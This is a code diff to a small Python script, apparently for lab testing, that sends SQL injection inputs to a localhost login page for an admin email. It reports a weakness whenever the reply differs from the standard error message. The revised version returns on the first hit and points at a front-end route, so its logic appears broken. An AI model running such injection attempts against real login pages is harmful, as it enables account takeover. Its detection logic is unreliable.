@@ -22,29 +22,24 @@ def input_values(email):
 
 def check_login(url, values):
     """sends sqli to the login page and returns True if sqli vulnerabilities are found, False otherwise"""
-    is_vulnerable = False
+    weakness_count = []
     for input_value in values:
         response = requests.post(url, data=input_value)
-        bs = BeautifulSoup(response.text, "html.parser")
-        messageList = bs.find_all("div", {"class": "message"})  # finds message's attributes on the pages
         web_warning_message = 'Invalid email or password.'
         web_response = response.text
         if web_response != (web_warning_message):
-            print(f"[+] SQL INJECTION detected on {url}")
-            print(f"[*] input values:")
-            print(input_value)
-            is_vulnerable = True
-
-    return f"\nSQL INJECTION VULNERABILITY STATUS; {is_vulnerable}"
+            weakness_count.append(input_value)
+            return f"Security weakness: {len(weakness_count)}\n[*] {input_value}"
 
 
 if __name__ == "__main__":
     try:
         print("\t-- SQL INJECTION ATTACK --\n")
-        print(f"Default email\t[admin@gmail.com]\nDefault url\t[http://localhost:3000/rest/user/login]\n")
-        email = "admin@gmail.com"  # Existing email
-        url = "http://localhost:3000/rest/user/login"
+        email = "admin@gmail.com"
+        url = "http://localhost:3000/#/login"
         values = input_values(email)
         print(check_login(url, values))
+
+
     except:
         print("SYSTEM MESSAGE:\n\t[X] Automatic test failed...")
